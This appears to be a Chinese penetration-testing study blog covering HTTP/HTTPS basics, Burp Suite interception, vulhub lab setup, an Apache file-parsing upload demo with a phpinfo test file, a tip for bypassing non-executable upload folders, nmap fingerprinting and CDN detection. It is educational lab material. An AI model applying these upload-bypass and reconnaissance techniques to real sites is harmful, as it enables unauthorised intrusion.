+<h4 id="●-HTTP特点"><a href="#●-HTTP特点" class="headerlink" title="**●**HTTP特点"></a>**●**HTTP特点</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http协议支持客户端/服务端模式，也是一种请求/响应模式的协议。</span><br><span class="line"></span><br><span class="line">简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。</span><br><span class="line"></span><br><span class="line">灵活：HTTP允许传输任意类型的数据对象。传输的类型由Content-Type加以标记。</span><br><span class="line"></span><br><span class="line">无连接：限制每次连接只处理一个请求。服务器处理完请求，并收到客户的应答后，即断开连接，但是却不利于客户端与服务器保持会话连接，为了弥补这种不足，产生了两项记录http状态的技术，一个叫做Cookie,一个叫做Session。</span><br><span class="line"></span><br><span class="line">无状态：无状态是指协议对于事务处理没有记忆，后续处理需要前面的信息，则必须重传。</span><br></pre></td></tr></table></figure>
+
+<h4 id="●-URI和URL的区别"><a href="#●-URI和URL的区别" class="headerlink" title="**●**URI和URL的区别"></a>**●**URI和URL的区别</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。</span><br><span class="line"></span><br><span class="line">URI：Uniform Resource Identifier 统一资源标识符</span><br><span class="line">URL：Uniform Resource Location 统一资源定位符</span><br><span class="line">URI 是用来标示 一个具体的资源的，我们可以通过 URI 知道一个资源是什么。</span><br><span class="line"></span><br><span class="line">URL 则是用来定位具体的资源的，标示了一个具体的资源位置。互联网上的每个文件都有一个唯一的URL。</span><br></pre></td></tr></table></figure>
+
+<h4 id="●-HTTP报文组成"><a href="#●-HTTP报文组成" class="headerlink" title="**●**HTTP报文组成"></a>**●**HTTP报文组成</h4><ol>
+<li><pre><code>1. 请求行：包括请求方法、URL、协议/版本
+2. 请求头(Request Header)
+3. 请求正文
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2. </span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622351999792-48a14997-ba55-48d6-bccf-5e7cff123fce.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_450%2Climit_0)</span><br><span class="line"></span><br><span class="line">#### **●**响应报文构成</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+1 状态行
+2 响应头
+3 响应正文
+</code></pre>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622352005270-f279fd02-7fee-4076-ab1c-d4b5749e301a.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_450%2Climit_0)</span><br><span class="line"></span><br><span class="line">#### **●**常见请求方法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>GET:请求指定的页面信息，并返回实体主体。<br>POST:向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。<br>HEAD:类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头<br>PUT:从客户端向服务器传送的数据取代指定的文档的内容。<br>DELETE:请求服务器删除指定的页面。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### **get请求**</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622352005311-d1d635ef-9e78-413b-b034-4cf5e442f53b.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_450%2Climit_0)</span><br><span class="line"></span><br><span class="line">##### **post请求**</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622351999710-b2f8274c-36b5-4739-8878-e5a5fb573629.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_450%2Climit_0)</span><br><span class="line"></span><br><span class="line">##### **post和get的区别**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>都包含请求头请求行，post多了请求body。<br>get多用来查询，请求参数放在url中，不会对服务器上的内容产生作用。post用来提交，如把账号密码放入body中。<br>GET是直接添加到URL后面的，直接就可以在URL中看到内容，而POST是放在报文内部的，用户无法直接看到。<br>GET提交的数据长度是有限制的，因为URL长度有限制，具体的长度限制视浏览器而定。而POST没有。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### **响应状态码**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>访问一个网页时，浏览器会向web服务器发出请求。此网页所在的服务器会返回一个包含HTTP状态码的信息头用以响应浏览器的请求。<br>状态码分类：<br>1XX- 信息型，服务器收到请求，需要请求者继续操作。<br>2XX- 成功型，请求成功收到，理解并处理。<br>3XX - 重定向，需要进一步的操作以完成请求。<br>4XX - 客户端错误，请求包含语法错误或无法完成请求。<br>5XX - 服务器错误，服务器在处理请求的过程中发生了错误。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### **常见状态码**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>200 OK - 客户端请求成功<br>301 - 资源（网页等）被永久转移到其它URL<br>302 - 临时跳转<br>400 Bad Request - 客户端请求有语法错误，不能被服务器所理解<br>401 Unauthorized - 请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用<br>404 - 请求资源不存在，可能是输入了错误的URL<br>500 - 服务器内部发生了不可预期的错误<br>503 Server Unavailable - 服务器当前不能处理客户端的请求，一段时间后可能恢复正常。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### **为什么要用https？**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实际使用中，绝大说的网站现在都采用的是https协议，这也是未来互联网发展的趋势。下面是通过wireshark抓取的一个博客网站的登录请求过程。</span><br><span class="line"></span><br><span class="line">![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622351999972-3b2906df-6d12-42c1-9925-0fc70103e928.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以看到访问的账号密码都是明文传输， 这样客户端发出的请求很容易被不法分子截取利用，因此，HTTP协议不适合传输一些敏感信息，比如：各种账号、密码等信息，使用http协议传输隐私信息非常不安全。</span><br><span class="line"></span><br><span class="line">##### **一般http中存在如下问题**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>请求信息明文传输，容易被窃听截取。<br>数据的完整性未校验，容易被篡改<br>没有验证对方身份，存在冒充危险</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### **什么是HTTPS?**</span><br><span class="line"></span><br><span class="line">为了解决上述HTTP存在的问题，就用到了HTTPS。</span><br><span class="line"></span><br><span class="line">HTTPS 协议（HyperText Transfer Protocol over Secure Socket Layer）：一般理解为HTTP+SSL/TLS，通过 SSL证书来验证服务器的身份，并为浏览器和服务器之间的通信进行加密。</span><br><span class="line"></span><br><span class="line">##### **那么SSL又是什么？**</span><br><span class="line"></span><br><span class="line">SSL（Secure Socket Layer，安全套接字层）：1994年为 Netscape 所研发，SSL 协议位于 TCP/IP 协议与各种应用层协议之间，为数据通讯提供安全支持。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TLS（Transport Layer Security，传输层安全）：其前身是 SSL，它最初的几个版本（SSL 1.0、SSL 2.0、SSL 3.0）由网景公司开发，1999年从 3.1 开始被 IETF 标准化并改名，发展至今已经有 TLS 1.0、TLS 1.1、TLS 1.2 三个版本。SSL3.0和TLS1.0由于存在安全漏洞，已经很少被使用到。TLS 1.3 改动会比较大，目前还在草案阶段，目前使用最广泛的是TLS 1.1、TLS 1.2。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### **SSL发展史（互联网加密通信）**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>1994年NetSpace公司设计SSL协议（Secure Sockets Layout）1.0版本，但未发布。<br>1995年NetSpace发布SSL&#x2F;2.0版本，很快发现有严重漏洞<br>1996年发布SSL&#x2F;3.0版本，得到大规模应用<br>1999年，发布了SSL升级版TLS&#x2F;1.0版本，目前应用最广泛的版本<br>2006年和2008年，发布了TLS&#x2F;1.1版本和TLS&#x2F;1.2版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### **浏览器在使用HTTPS传输数据的流程是什么？**</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622352000732-7741fa61-72b9-4a59-8f34-73a7c93618b0.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>首先客户端通过URL访问服务器建立SSL连接。<br>服务端收到客户端请求后，会将网站支持的证书信息（证书中包含公钥）传送一份给客户端。<br>客户端的服务器开始协商SSL连接的安全等级，也就是信息加密的等级。<br>客户端的浏览器根据双方同意的安全等级，建立会话密钥，然后利用网站的公钥将会话密钥加密，并传送给网站。<br>服务器利用自己的私钥解密出会话密钥。<br>服务器利用会话密钥加密与客户端之间的通信。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### HTTPS的缺点</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>HTTPS协议多次握手，导致页面的加载时间延长近50%；<br>HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗；<br>申请SSL证书需要钱，功能越强大的证书费用越高。<br>SSL涉及到的安全算法会消耗 CPU 资源，对服务器资源消耗较大。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### **总结HTTPS和HTTP的区别**</span><br><span class="line"></span><br><span class="line">- HTTPS是HTTP协议的安全版本，HTTP协议的数据传输是明文的，是不安全的，HTTPS使用了SSL/TLS协议进行了加密处理。</span><br><span class="line">- http和https使用连接方式不同，默认端口也不一样，http是80，https是443。</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622351185970-116d66cc-4c92-4357-a90a-8da4b4a724e2.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_772%2Climit_0)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Request	请求数据包<br>Reponse	相应数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622351304043-6cdce93e-612c-419c-84e5-d4a7e38ae49e.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_801%2Climit_0)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>#Requeset	请求数据包<br>#Proxy		代理服务器<br>#Reponse	相应数据包<br>代理的出现在接受数据包和发送数据包的时候提供了修改数据包的机会 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通信过程</p>
+<p>1.浏览器建立与web服务器之间的连接<br>2.浏览器将请求数据打包（生成请求数据包）并发送到web服务器<br>3.web服务器将处理结果打包（生成响应数据包）并发送给浏览器</p>
+<p>4.web服务器关闭连接</p>
+<p>总结：<br>建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接</p>
+<p>数据格式<br>请求数据包包含什么<br>1.请求行：请求类型&#x2F;请求资源路径、协议的版本和类型<br>2.请求头：一些键值对，一般由w3c定义，浏览器与web服务器之间都可以发送，表示特定的某种含义</p>
+<p>3.【空行】请求头与请求体之间用一个空行隔开；</p>
+<p>4.请求体：要发送的数据(一般post方式会使用)；<br>例：userName&#x3D;123&amp;password&#x3D;123&amp;returnUrl&#x3D;&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### http与https的区别</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>http通信过程</p>
+<p>建立连接—&gt;发送请求数据包—&gt;返回响应数据包——&gt;关闭连接1.浏览器建立与web服务器之间的连接<br>1.浏览器建立与web服务器之间的连接<br>2.浏览器将请求数据打包（生成请求数据包）并发送到web服务器<br>3.web服务器将处理结果打包（生成响应数据包）并发送给浏览器<br>4.web服务器关闭连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 2、windows安装burp</span><br><span class="line"></span><br><span class="line">参考文档</span><br><span class="line"></span><br><span class="line">配置Java环境</span><br><span class="line"></span><br><span class="line">https://www.runoob.com/java/java-environment-setup.html</span><br><span class="line"></span><br><span class="line">安装burp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 3、burp代理设置</span><br><span class="line"></span><br><span class="line">![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622361703221-db163ed6-2786-4863-b0f6-91a2ac170ebe.png)</span><br><span class="line"></span><br><span class="line">![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622361749422-69ad9e29-194f-4c03-892a-feead9dec183.png)</span><br><span class="line"></span><br><span class="line">**第三方查询信息平台**</span><br><span class="line"></span><br><span class="line">http://ip.chinaz.com/</span><br><span class="line"></span><br><span class="line">修改站长之家的返回信息</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622363323304-b57790ef-2191-4a2e-a70a-0b34e7cdf117.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)</span><br><span class="line"></span><br><span class="line">##### **通过修改数据包改动页面上的信息**</span><br><span class="line"></span><br><span class="line">修改之前的数据包</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622363377112-3d2ba263-5b89-414c-a5da-2740293003c5.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622363377112-3d2ba263-5b89-414c-a5da-2740293003c5.png)</span><br><span class="line"></span><br><span class="line">在修改的数据包不止一个是站长之家的信息还有百度地图的信息是为了获取我们Ip地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们修改user-agent信息把他改为111111</span><br><span class="line"></span><br><span class="line">![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622363712056-ce9cb946-88e0-4d91-8920-63002db4cf76.png)</span><br><span class="line"></span><br><span class="line">这个操作没得任何的意义只是证明是网站是通过数据包访问</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>修改kali的网络源<br>cat &gt;&#x2F;etc&#x2F;apt&#x2F;sources.list &lt;&lt;EOF</p>
+<h1 id="See-https-www-kali-org-docs-general-use-kali-linux-sources-list-repositories"><a href="#See-https-www-kali-org-docs-general-use-kali-linux-sources-list-repositories" class="headerlink" title="See https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/"></a>See <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/</a></h1><p>#deb <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main contrib non-free</p>
+<h1 id="Additional-line-for-source-packages"><a href="#Additional-line-for-source-packages" class="headerlink" title="Additional line for source packages"></a>Additional line for source packages</h1><h1 id="deb-src-http-http-kali-org-kali-kali-rolling-main-contrib-non-free"><a href="#deb-src-http-http-kali-org-kali-kali-rolling-main-contrib-non-free" class="headerlink" title="deb-src http://http.kali.org/kali kali-rolling main contrib non-free"></a>deb-src <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main contrib non-free</h1><p>#deb <a href="https://mirrors.aliyun.com/kali">https://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>#deb-src <a href="https://mirrors.aliyun.com/kali">https://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
+<p>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p>
+<p>EOF</p>
+<p>安装火狐中文环境<br>apt install firefox-esr-l10n-zh-cn</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 4、burp抓取https数据包</span><br><span class="line"></span><br><span class="line">第一步在burp中将证书导出到本地</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622443869019-581d9452-1290-4a0a-8b9a-f2bde7da5b67.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">第二步</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622443894138-03beeab0-f0c6-4f87-aca3-e6e1e3b7e472.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">第三步</span><br><span class="line"></span><br><span class="line">![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622444024139-3fbf1b88-37bc-4626-b521-3851e208a2e1.png)</span><br><span class="line"></span><br><span class="line">第四步</span><br><span class="line"></span><br><span class="line">![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622445298967-7190ae07-37f0-468f-a1f9-8b8de52361fb.png)</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622445258297-1b85797a-3193-4dd2-b830-347190f65366.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622445393532-123efeb1-1108-4af7-aa29-efe58b9da6df.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">##### 5、burp抓取APP数据包</span><br><span class="line"></span><br><span class="line">## Day3 搭建数据安全拓展</span><br><span class="line"></span><br><span class="line">### 1、涉及的知识点</span><br><span class="line"></span><br><span class="line">- 常见搭建平台脚本启用</span><br><span class="line">- 域名旧目录解析安全问题</span><br><span class="line">- 常见文件后缀解析对应安全</span><br><span class="line">- 常见安全测试中的安全防护</span><br><span class="line">- WEB后门与用户及文件权限</span><br><span class="line"></span><br><span class="line">### 2、常见的问题</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>#ASP,PHP,ASPx,JSP,PY,JAVAWEB等环境</p>
+<p>#WEB源码中敏感文件<br>后台路径，数据库配置文件，备份文件等</p>
+<p>#ip或域名解析wEB源码目录对应下的存在的安全问题<br>域名访问，IP访问（结合类似备份文件目录)</p>
+<p>#脚本后缀对应解析（其他格式可相同-上传安全)<br>#存在下载或为解析问题</p>
+<p>#常见防护中的IP验证，域名验证等</p>
+<p>#后门是否给予执行权限</p>
+<p>#后门是否给予操作目录或文件权限#后门是否给予其他用户权限</p>
+<p>#总结下关于可能会存在的安全或防护问题?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 3、web权限的设置</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code> 在一般的情况下我们会对某个目录取消执行权限、最典型的就是图片目录这个目录只放图像没有脚本我们会取消执行的权限、这样我们可以防范一部分的文件上传漏洞、即使开发写的代码有问题也不会导致服务器出现安全事故。
+ 
+ 绕过方法：
+ 如果我们上传的文件如果不能正常的执行那么将文件放在其他目录、例如网站的根目录下面
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 4、演示案例-环境搭建</span><br><span class="line"></span><br><span class="line">#### 1、PHPinfo</span><br><span class="line"></span><br><span class="line">- 基于中间件的简要识别</span><br><span class="line"></span><br><span class="line">一般可以通过抓包的方式分析出是什么类型的服务器和中间件</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622700527471-3a825366-e98b-45be-9572-c0920e247011.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)</span><br><span class="line"></span><br><span class="line">可以看见在自己搭建的平台看见使用的apache(windows) php7.3</span><br><span class="line"></span><br><span class="line">- 基于中间件的安全漏洞</span><br><span class="line"></span><br><span class="line">可以根据在第一步上面收集到的信息、去找Apache的漏洞和PHP的漏洞</span><br><span class="line"></span><br><span class="line">- 基于中间件的靶场使用</span><br><span class="line"></span><br><span class="line">https://vulhub.org/#/environments/</span><br><span class="line"></span><br><span class="line">这个是用docker搭建的一个靶场非常的方便</span><br><span class="line"></span><br><span class="line">环境搭建并测试,参考文档：https://vulhub.org/#/docs/install-docker-one-click/</span><br><span class="line"></span><br><span class="line">第一步安装好docker环境并下载文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>[root@hdss7-11 ~]# docker -v<br>Docker version 20.10.6, build 370c289<br>[root@hdss7-11 ~]# docker-compose -v<br>docker-compose version 1.18.0, build 8dd22a9<br>[root@hdss7-11 ~]# cd &#x2F;opt&#x2F;vulhub&#x2F;<br>[root@hdss7-11 vulhub]# wget <a href="https://github.com/vulhub/vulhub/archive/master.zip">https://github.com/vulhub/vulhub/archive/master.zip</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">第二步https://vulhub.org/#/environments/查找你想做的环境</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622707451675-f5174469-2a23-4e9d-9b2a-d6bdc5629973.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>[root@hdss7-11 vulhub]# cd vulhub-master&#x2F;httpd&#x2F;apache_parsing_vulnerability&#x2F;<br>[root@hdss7-11 apache_parsing_vulnerability]# docker-compose up -d</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622707779631-f451c201-18e0-4689-8685-823bb22bc31e.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">创建文件并命名为`x.php.jpeg`并上传</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p> cat x.php.jpeg<br><?php
+       phpinfo();
+?></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622708228398-8da74a73-5168-4203-ac82-8cd6d31e18d3.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622708358457-161dc652-8bfd-4312-ab9e-bc79a6330840.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">#### 2、wordpress</span><br><span class="line"></span><br><span class="line">![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622708616162-5775e6c6-510e-4885-aa45-2c33b99d6666.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>[root@hdss7-11 vulhub-master]# find . -name wordpress<br>.&#x2F;base&#x2F;wordpress<br>.&#x2F;wordpress<br>[root@hdss7-11 vulhub-master]# cd wordpress&#x2F;<br>[root@hdss7-11 wordpress]# cd pwnscriptum&#x2F;<br>1.png  docker-compose.yml  exploit.py  README.md  README.zh-cn.md<br>[root@hdss7-11 pwnscriptum]# docker-compose up -d</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622709589181-6af61eb1-96cd-479d-8616-89bf3a8f7e03.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">## Day4 **web源码拓展**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>前言:WEB源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中WEB源码有很多技术需要简明分析。比如:获取某ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1、关于WEB源码目录结构</span><br><span class="line"></span><br><span class="line">2、关于WEB源码脚本类型</span><br><span class="line"></span><br><span class="line">3、关于WEB源码应用分类</span><br><span class="line"></span><br><span class="line">4、关于WEB源码其他说明</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>#数据库配置文件，后台目录，模版目录，数据库目录等</p>
+<p>#ASP,PHP,ASPX,JSP,JAVAWEB等脚本类型源码安全问题</p>
+<p>#社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
+<p>#开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等</p>
+<p>#关于源码获取的相关途径:搜索，咸鱼淘宝，第三方源码站，各种行业对应</p>
+<p>#总结:</p>
+<p>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak文件等），未获取到的源码采用各种方法想办法获取!</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1622711788547-6d6af02d-1d54-4110-b24e-c132e1746624.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">参考文档：https://websec.readthedocs.io/zh/latest/intranet/windows.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第三方源码获取：https://www.cnyma.com/</span><br><span class="line"></span><br><span class="line">## Day5 系统及数据库</span><br><span class="line"></span><br><span class="line">#### 1、识别操作系统常见方法</span><br><span class="line"></span><br><span class="line">**a、有网站**</span><br><span class="line"></span><br><span class="line">可以通过网站识别通过网站的手工识别方法判断：</span><br><span class="line"></span><br><span class="line">windows对大小写不敏感也就是说你在网页中可以替换网站路径的大小写进行测试</span><br><span class="line"></span><br><span class="line">**b、没有网站**</span><br><span class="line"></span><br><span class="line">通过nmap进行扫描方法：</span><br><span class="line"></span><br><span class="line">nmap -O IP地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>──(root💀kali)-[~&#x2F;桌面]<br>└─# nmap -O 10.1.1.10<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-06-07 21:06 CST<br>Nmap scan report for 10.1.1.10 (10.1.1.10)<br>Host is up (0.0011s latency).<br>Not shown: 999 closed ports<br>PORT   STATE SERVICE<br>22&#x2F;tcp open  ssh<br>MAC Address: 00:0C:29:13:E9:61 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Day6 加密编码算法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>#常见加密编码等算法解析<br>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</p>
+<p>#常见加密形式算法解析<br>直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p>
+<p>#常见解密方式（针对)<br>枚举，自定义逆向算法，可逆向</p>
+<p>#了解常规加密算法的特性<br>长度位数，字符规律，代码分析，搜索获取等</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Day7 CDN绕过方法</span><br><span class="line"></span><br><span class="line">CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</span><br><span class="line"></span><br><span class="line">![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623216008707-d063e412-ff3d-4256-8b9d-8ef9ef41d219.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 1、如何判断目标存在CDN服务?</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">利用多节点技术进行请求返回判断</span><br><span class="line">	http://ping.chinaz.com/</span><br><span class="line"> 	http://ping.aizhan.com/</span><br><span class="line">  http://ce.cloud.360.cn/</span><br></pre></td></tr></table></figure>
+
+<p>如果ping的结果只有一个那么就没有CDN、要是不止一个则可以判断为有CDN</p>
+<p>没有使用CDN</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623217475468-cd530cb6-3c7d-45c6-8346-ec66dcc9993f.png" alt="img" loading="lazy"></p>
+<p>使用CDN</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623217655187-bcd611f8-5ddc-4c9e-af74-05ab076501bb.png" alt="img" loading="lazy"></p>
